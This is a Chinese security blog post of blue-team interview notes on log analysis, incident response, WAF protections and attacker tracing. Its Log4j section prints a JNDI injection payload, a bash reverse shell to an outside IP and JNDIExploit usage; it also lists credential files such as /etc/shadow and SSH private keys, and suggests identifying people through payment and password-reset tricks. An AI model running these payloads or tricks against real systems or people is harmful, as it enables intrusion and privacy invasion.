<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>

<p>定位有哪些IP在爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br></pre></td></tr></table></figure>

<p>爆破用户名字典是什么</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print&quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>

<p>登录成功的IP有哪些</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>

<p>登录成功的日期、用户名、IP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>增加一个用户kali日志<br>grep “useradd” /var/log/secure</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001,</span><br><span class="line">home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br></pre></td></tr></table></figure>

<p>删除用户kali日志<br>grep “userdel” /var/log/secure</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br></pre></td></tr></table></figure>

<p>su切换用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by</span><br><span class="line">root(uid&#x3D;0)</span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo: good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ;</span><br><span class="line">COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure>

<h3 id="一个比较大的日志，应该如何分析"><a href="#一个比较大的日志，应该如何分析" class="headerlink" title="一个比较大的日志，应该如何分析"></a>一个比较大的日志，应该如何分析</h3><ol>
<li>攻击规则匹配，通过正则匹配日志中的攻击请求</li>
<li>统计方法，统计请求出现次数，次数少于同类请求平均次数则为异常请求</li>
<li>白名单模式，为正常请求建立白名单，不在名单范围内则为异常请求</li>
<li>HMM 模型，类似于白名单，不同点在于可对正常请求自动化建立模型，从而通过正常模型找出不匹配者则为异常请求</li>
<li>借助日志分析工具，如 LogForensics 腾讯实验室 <a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/opensource/detail/15">https://security.tencent.com/index.php/opensource/detail/15</a></li>
</ol>
<h3 id="Windows在应急响应中的安全日志以及对应场景"><a href="#Windows在应急响应中的安全日志以及对应场景" class="headerlink" title="Windows在应急响应中的安全日志以及对应场景"></a>Windows在应急响应中的安全日志以及对应场景</h3><p>Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志<br>系统日志： %SystemRoot%\System32\Winevt\Logs\System.evtx<br>应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx<br>安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx</p>
<p>Linux<br>日志默认存放位置：/var/log/<br>查看日志配置情况：more /etc/rsyslog.conf</p>
<h3 id="常见中间件的配置文件路径"><a href="#常见中间件的配置文件路径" class="headerlink" title="常见中间件的配置文件路径"></a>常见中间件的配置文件路径</h3><p>apache：/etc/httpd/conf<br>nginx：/etc/nginx<br>iis7：C:\Windows\System32\inetsrv\config\</p>
<h3 id="如何查看系统内存shell"><a href="#如何查看系统内存shell" class="headerlink" title="如何查看系统内存shell"></a>如何查看系统内存shell</h3><p>linux<br>etc/passwd、etc/shadow直接读密码<br>/etc/hosts # 主机信息<br>/root/.bashrc # 环境变量<br>/root/.bash_history # 还有root外的其他用户<br>/root/.viminfo # vim 信息<br>/root/.ssh/id_rsa # 拿私钥直接ssh<br>/proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite<br>数据库config文件<br>web日志 access.log, error.log<br>ssh日志<br>/root/.ssh/id_rsa<br>/root/.ssh/id_rsa.pub<br>/root/.ssh/authorized_keys<br>/etc/ssh/sshd_config<br>/var/log/secure<br>/etc/sysconfig/network-scripts/ifcfg-eth0<br>/etc/syscomfig/network-scripts/ifcfg-eth1</p>
<p>/var/lib/php/sess_PHPSESSID #非常规问题session文件 <a target="_blank" rel="noopener" href="http://www.jianshu.com/p/2c24ea34566b">http://www.jianshu.com/p/2c24ea34566b</a></p>
<p>windows<br>C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS 配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql 配置<br>C:\Program Files\mysql\data\mysql\user.MY D //Mysql root<br>C:\Windows\php.ini //php 配置信息<br>C:\Windows\my.ini //Mysql 配置信息</p>
<h3 id="如何分析被代理出来的数据流"><a href="#如何分析被代理出来的数据流" class="headerlink" title="如何分析被代理出来的数据流"></a>如何分析被代理出来的数据流</h3><p>分析数据包请求头中的 xff、referer 等收集有用的信息</p>
<h3 id="windows端口进程间转换"><a href="#windows端口进程间转换" class="headerlink" title="windows端口进程间转换"></a>windows端口进程间转换</h3><p>端口-&gt;进程</p>
<ol>
<li>netstat -ano | findstr “port”查看目前的网络连接，定位可疑的 ESTABLISHED</li>
<li>根据netstat 定位出的 pid，再通过tasklist命令进行进程定位 tasklist | findstr “PID”</li>
</ol>
<h3 id="查看进程对应的程序位置"><a href="#查看进程对应的程序位置" class="headerlink" title="查看进程对应的程序位置"></a>查看进程对应的程序位置</h3><p>任务管理器–选择对应进程–右键打开文件位置运行输入 wmic，cmd界面 输入 process<br>查看 Windows 服务所对应的端口<br>%system%/system32/drivers/etc/services（一般 %system% 就是 C:\Windows）</p>
<h3 id="查看windows进程的方法"><a href="#查看windows进程的方法" class="headerlink" title="查看windows进程的方法"></a>查看windows进程的方法</h3><ol>
<li>开始 – 运行 – 输入msinfo32 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等</li>
<li>打开D盾_web查杀工具，进程查看，关注没有签名信息的进程</li>
<li>通过微软官方提供的 Process Explorer 等工具进行排查</li>
</ol>
<p>查看可疑的进程及其子进程。可以通过观察以下内容：<br>没有签名验证信息的进程<br>没有描述信息的进程<br>进程的属主<br>进程的路径是否合法<br>CPU 或内存资源占用长时间过高的进程</p>
<h3 id="内网横向攻击"><a href="#内网横向攻击" class="headerlink" title="内网横向攻击"></a>内网横向攻击</h3><p>确定攻击来源，是不是员工内部误操作，比如询问运维是否有自动化轮训脚本<br>如果没有，确定是攻击，结合时间点，根据设备信息，看一下安全事件，进程，流量<br>找到问题主机，开始应急响应流程：准备、检测、遏制、根除、恢复、跟踪，具体的操作要交给现场运维去处理</p>
<h3 id="横向越权漏洞的修复"><a href="#横向越权漏洞的修复" class="headerlink" title="横向越权漏洞的修复"></a>横向越权漏洞的修复</h3><p>横向越权：横向越权指的是攻击者尝试访问与他拥有相同权限的用户的资源<br>纵向越权：纵向越权指的是一个低级别攻击者尝试访问高级别用户的资源<br>对于纵向越权，我们可以通过设置用户角色，为不同的角色提供不同的权限来避免<br>为了防止横向越权，我们可以使用缓存来进行辅助，当登录成功或者进行操作时，我们在缓存中存储一对由用户名和一个唯一的数字组成的数据（token），然后返回放入的唯一数据在重置密码时我们的参数不仅需要用户名和密码还需要前面生成的唯一数字，根据用户名在缓存中取出对应的数字，如果取出的数字和参数中传入的想等，则证明重置的当前用户的密码，否则不是，且不予以重置</p>
<h3 id="如何反爬"><a href="#如何反爬" class="headerlink" title="如何反爬"></a>如何反爬</h3><p>后台对访问进行统计，如果单个 IP 访问超过阈值，予以封锁<br>后台对访问进行统计，如果单个 session 访问超过阈值，予以封锁<br>后台对访问进行统计，如果单个 userAgent 访问超过阈值，予以封锁</p>
<h3 id="iptables-工作在-TCP-IP-模型中的哪层"><a href="#iptables-工作在-TCP-IP-模型中的哪层" class="headerlink" title="iptables 工作在 TCP/IP 模型中的哪层"></a>iptables 工作在 TCP/IP 模型中的哪层</h3><p>网络层</p>
<h3 id="Log4j-CNVD-2021-95914、CVE-2021-44228"><a href="#Log4j-CNVD-2021-95914、CVE-2021-44228" class="headerlink" title="Log4j  CNVD-2021-95914、CVE-2021-44228"></a>Log4j  CNVD-2021-95914、CVE-2021-44228</h3><p>log4j 是 javaweb 的日志组件，用来记录web日志</p>
<p>由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞</p>
<p>影响版本<br>2.X &lt; 2.15.0-rc2</p>
<p>去指定下载文件的 url 在搜索框或者搜索的 url 里面，加上 ${jndi:ldap://127.0.0.1/test} ，log4j 会对这串代码进行表达式解析，给 lookup 传递一个恶意的参数指定，参数指的是比如 ldap 不存在的资源 $ 是会被直接执行的。后面再去指定下载文件的 url，去下载我们的恶意文件。比如是 x.class 下载完成后，并且会执行代码块</p>
<p>docker pull vulfocus/log4j2-rce-2021-12-09:latest<br>docker run -d -P vulfocus/log4j2-rce-2021-12-09<br>抓包 192.168.1.103:49153/hello</p>
<p>POST /hello Http/1.1</p>
<p>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 69<br>cmd:/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.150.202/5001 0&gt;&amp;1’</p>
<p>payload=${jndi:ldap://192.168.0.108:1389/TomcatBypass/TomcatEcho}</p>
<p>使用Exp,JNDIExploit-1.2-SNAPSHOT.jar 包<br>运行 JNDI 服务,LDAP 监听端口为 7000，http 监听端口为 5000; java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <em>.</em>.<em>.</em> -l 7000 -p 5000<br>工具地址 <a href="https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2">https://github.com/Mr-xn/JNDIExploit-1/releases/tag/v1.2</a></p>
<p>修复：升级 Log4j 到最新版本，根据业务判断是否关闭 lookup</p>
<h3 id="WAF有哪些防护方式"><a href="#WAF有哪些防护方式" class="headerlink" title="WAF有哪些防护方式"></a>WAF有哪些防护方式</h3><p>Web基础防护<br>可防范常规的 web 应用攻击，如 SQL 注入攻击、XSS 跨站攻击等，可检测 webshell，检查 HTTP 上传通道中的网页木马，打开开关即实时生效</p>
<p>CC 攻击防护<br>可根据 IP、Cookie 或者 Referer 字段名设置灵活的限速策略，有效缓解 CC 攻击</p>
<p>精准访问防护<br>对常见 HTTP 字段进行条件组合， 支持定制化防护策略如CSRF防护，通过自定义规则的配置，更精准的识别恶意伪造请求、保护网站敏感信息、提高防护精准性</p>
<p>IP 黑白名单<br>添加终拦截与始终放行的黑白名单 IP，增加防御准确性</p>
<p>地理位置访问控制<br>添加地理位置访问控制规则，针对来源 IP 进行自定义访问控制</p>
<p>网页防篡改<br>对网站的静态网页进行缓存配置，当用户访问时返回给用户缓存的正常页面，并随机检测网页是否被篡改</p>
<p>网站反爬虫<br>动态分析网站业务模型，结合人机识别技术和数据风控手段，精准识别爬虫行为</p>
<p>误报屏蔽<br>针对特定请求忽略某些攻击检测规则，用于处理误报事件</p>
<p>隐私屏蔽<br>隐私信息屏蔽，避免用户的密码等信息出现在事件日志中</p>
<p>防敏感信息泄露<br>防止在页面中泄露用户的敏感信息，例如：用户的身份证号码、手机号码、电子邮箱等</p>
<h3 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h3><p>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等<br>日志与流量分析，异常的通讯流量、攻击源与攻击目标等<br>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等<br>邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等<br>蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息</p>
<p>技巧</p>
<ol>
<li>域名、ip 反查目标个人信息</li>
<li>支付宝转账，确定目标姓氏</li>
<li>淘宝找回密码，确定目标名字</li>
<li>企业微信手机号查公司名称</li>
<li>REG007 查注册应用、网站</li>
<li>程序 PDB 信息泄露</li>
</ol>
<p>流量溯源<br>可利用流量工具 wireshark 进行溯源：</p>
<ol>
<li>查看 eval、 z0、 shell whoami 等关键字，查看出现次数过多的时候， 需要查看是哪个页面发起的请求，有可能是 webshell</li>
<li>通过 WireShark 工具快速搜索关键字，定位到异常流量包</li>
<li>找出异常 IP 和所上传的内容，查看是否为 webshell</li>
</ol>
<p>域前置溯源方法思考<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260888">https://www.anquanke.com/post/id/260888</a></p>
    </div>
  </div>
  
    <div class="copy-right">
      <div class="markdown-body">
        <blockquote>
        
        
          本文作者 : JohnScott <br/>
        
        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2022/80%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/</a><br>
        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
        </blockquote>
      </div>
    </div>
  
  
  
    <div class="social-share"
  style="margin-top: -2rem"
  data-wechat-qrcode-title="<p>微信扫一扫</p>"
  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
  
>
  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
</div>
<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
  

  
    <div id="reward">
  
    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
  
  <button id="reward-btn">
    
    <span>感谢您的关心</span>
  </button>
  <div id="reward-qrcode">
    
      <div class="reward-qrcode--container">
        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
        <p class="qrcode-meta">微信扫一扫</p>
      </div>
    
      <div class="reward-qrcode--container">
        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
        <p class="qrcode-meta">支付宝扫一扫</p>
      </div>
    
  </div>

</div>

<script>
  (() => {
    let button = document.querySelector('#reward-btn'),
      qrcode = document.querySelector('#reward-qrcode'),
      display = false;
    
    button.addEventListener('click', () => {
      qrcode.style.display = display ? 'none' : 'block'
      display = !display
    }, false)
  })()
</script>
  

  <div class="article-footer">
    <div class="article-meta pull-left">
      <span>
        
          <i class="iconfont icon-06tags"></i>标签: 
          
          <span class="span--tag">
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
              #网络安全
            </a>
          </span>
          
        
      </span>
    </div>
    <div class="article-meta pull-right">
    </div>
  </div>
</div>


  <aside id="sidebar">
    <p id="sidebar-header"></p>
    <ol id="sidebar-toc"></ol>
  </aside>
  <script async>setTimeout(generateToc, 10);</script>


  <nav class="post-navigation">
    
      <div class="nav-pre">
        <i class="iconfont icon-prev"></i>
        上一篇:
        <a href="/2022/79tcpdump/" target="_self">79tcpdump</a>
      </div>
    
    
      <div class="nav-next">
        下一篇:
        <a href="/2022/85shell/" target="_self">85shell</a>
        <i class="iconfont icon-next"></i>
      </div>
    
  </nav>

  
    <a href="#comment" class="comment-anchor"></a>
<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
<div id="vcomments"></div>

<script defer>
  if( true ) {
    let path = getRealPath()
    new Valine({
      el: "#vcomments",
      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
      notify: false,
      verify: false,
      avatar: "robohash",
      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
      path
    });
  }
</script>
   

  
    <script defer>
const valineAPI = (() => {
  try {
    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
  } catch(error) {}
  const isExist = (identity) => {
    identity = identity || getRealPath();
    let query = new AV.Query('Timer');
    return new Promise((resolve, reject) => {
      query.equalTo("identity", identity);
      query.find().then(results => {
        resolve(results.length > 0);
      }, error => reject(error));
    })
  }

  const _get = (identity) => {
    let query = null;
    if(identity && identity instanceof Array){
      let querys = [];
      for(let i = 0; i < identity.length; ++i) {
        querys[i] = new AV.Query('Timer');
        querys[i].equalTo('identity', identity[i]);
      }
      query = AV.Query.or.apply(null ,querys);
    } else {
      identity = identity || getRealPath();
      query = new AV.Query("Timer");
      query.equalTo("identity", identity);
    }

    return new Promise((resolve, reject) => {
      query.find()
      .then(results => resolve(results))
      .catch(error => reject(error))
    })
  }

  const create = (identity) => {
    identity = identity || getRealPath();
    return new Promise((resolve, reject) => {
      let Todo = AV.Object.extend('Timer');
      let todo = new Todo();
      todo.set("times", 1);
      todo.set("identity", identity);
      todo.save().then(res => resolve(true), error => reject(error));
    })
  }

  const update = (identity) => {
    identity = identity || getRealPath();
    return new Promise((resolve, reject) => {
      let query = new AV.Query('Timer');
      query.equalTo("identity", identity);
      query.find().then(todos => {
        todos.forEach(todo => {
          todo.set("times", todo.attributes.times + 1);
        });
        return AV.Object.saveAll(todos);
      }).then(todos => resolve(true), error => reject(error));
    })
  }

  return {
    isExist,
    _get,
    update,
    create
  }
})()

const calcAndWriteTimes = () => {
  let isPost = true;

  let timerAllDOM = document.querySelectorAll(".article-timer");

  if(isPost) {
    let identity = timerAllDOM[0].getAttribute("data-identity");
    valineAPI.isExist(identity)
    .then(exist => {
      if(exist) {
        return valineAPI.update(identity);
      }
      return new Promise(resolve => resolve(true));
    })
    .then( succuess => valineAPI._get(identity))
    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
    .catch(error => console.log(error.message))
    return ;
  }

  let timerDOMCache = {};

  for(let timerDOM of timerAllDOM) {
    let identity = timerDOM.getAttribute("data-identity");
    if(timerDOMCache.hasOwnProperty(identity)){
      timerDOMCache[identity].dom.push(timerDOM);
    }else{
      timerDOMCache[identity] = {
        dom: [timerDOM],
        times: undefined
      };
    }
  }

  let identities = Object.keys(timerDOMCache);
  valineAPI._get(identities).then(results => {
    for(let result of results) {
      let {identity, times} = result.attributes;
      timerDOMCache[identity].times = times;
      timerDOMCache[identity].dom.map(item => item.innerText = times);
    }
    for(let identity of identities) {
      if(timerDOMCache[identity].times){
        continue;
      }
      timerDOMCache[identity].dom.map(item => item.innerText = 1);
      valineAPI.create(identity);
    }
  }).catch(error => console.log(error.message))
}

if(true){
  calcAndWriteTimes();
}
</script>
   

</div>


      <footer>
  <p class="site-info">
    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
    <br>
    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
    <br>
    
  </p>
</footer>



<script>
const timeToNowDOM = document.querySelector("#time-to-now");
const startTimestamp = new Date(2015, 0, 1).getTime();

const updateTimeStr = () => {
  let offset = parseInt(
      (new Date().getTime() - startTimestamp) / 1000,
      10
    ),
    day = Math.floor(offset / 86400),
    hour = Math.floor((offset % 86400) / 3600),
    minute = Math.floor(((offset % 86400) % 3600) / 60),
    second = Math.floor(((offset % 86400) % 3600) % 60);
  timeToNowDOM.innerHTML =
    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
  setTimeout(updateTimeStr, 500);
}

setTimeout(updateTimeStr, 500);
</script>


      <div class="back-to-top hidden">
  <span>
    <i class="iconfont icon-60"></i><span></span>%
  </span>
</div>

<script>
const updateIconToTop = percent => {
  let dom = document.querySelector(".back-to-top span span");
  dom.innerText = percent;
  if(percent < 1) {
    document.querySelector(".back-to-top").className = "back-to-top hidden";
  } else {
    document.querySelector(".back-to-top").className = "back-to-top";
  }
}

const handleScoll = () => {
  let isRunning = false;
  return () => {
    if (isRunning) return;
    isRunning = true;
    window.requestAnimationFrame(timestamp => {
      let scrollTop =
          document.documentElement.scrollTop || document.body.scrollTop,
        scrollHeight =
          document.documentElement.scrollHeight ||
          document.body.scrollHeight,
        clientHeight =
          document.documentElement.clientHeight ||
          document.body.clientHeight;
      isRunning = false;
      if (scrollTop <= 1) {
        updateIconToTop(0);
        return;
      }
      if (scrollTop + clientHeight >= scrollHeight) {
        updateIconToTop(100);
      } else {
        updateIconToTop(parseInt(
          100 * scrollTop / (scrollHeight - clientHeight),
          10
        ));
      }
    });
  };
}

const backToTop = () => {
  let scrollTop =
      document.documentElement.scrollTop || document.body.scrollTop,
    delay = 10,
    time = 200;
  if (scrollTop <= 20) {
    document.documentElement.scrollTop = 0;
    document.body.scrollTop = 0;
    return;
  }
  let step = Math.ceil(scrollTop * delay / time);
  let timer = setInterval(() => {
    scrollTop =
      document.documentElement.scrollTop || document.body.scrollTop;
    if (scrollTop - step <= 0) {
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;
      clearInterval(timer);
    } else {
      document.documentElement.scrollTop = scrollTop - step;
      document.body.scrollTop = scrollTop - step;
    }
  }, delay);
}

document.addEventListener("scroll", handleScoll(), false);

document.querySelector(".back-to-top").addEventListener("click", backToTop, false);

</script>

    </div>

    
      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
<script>
  (() => {
    const mathjaxConfig = {
      showProcessingMessages: false, //关闭js加载过程信息
      messageStyle: "none", //不显示信息
      jax: ["input/TeX", "output/HTML-CSS"],
      tex2jax: {
        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
      },
      "HTML-CSS": {
        availableFonts: ["STIX", "TeX"], //可选字体
        showMathMenu: false //关闭右击菜单显示
      }
    }

    let mathjaxInterval = setInterval(() => {
      if(!window.MathJax){
        return;
      }
      window.MathJax.Hub.Config(mathjaxConfig)
      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])

      clearInterval(mathjaxInterval)
    }, 10)    
  })()
</script>
    

    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
<script async>
  let fancyTimer = setInterval(function(){
    if(!window.$){
      return;
    }
    $(document).ready(function() {
      $(".post img").each(function () {
        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
          return;
        }
        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "gallery");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      });
      
      clearInterval(fancyTimer);
    });
  }, 10);
</script>

    
  </body>

</html>
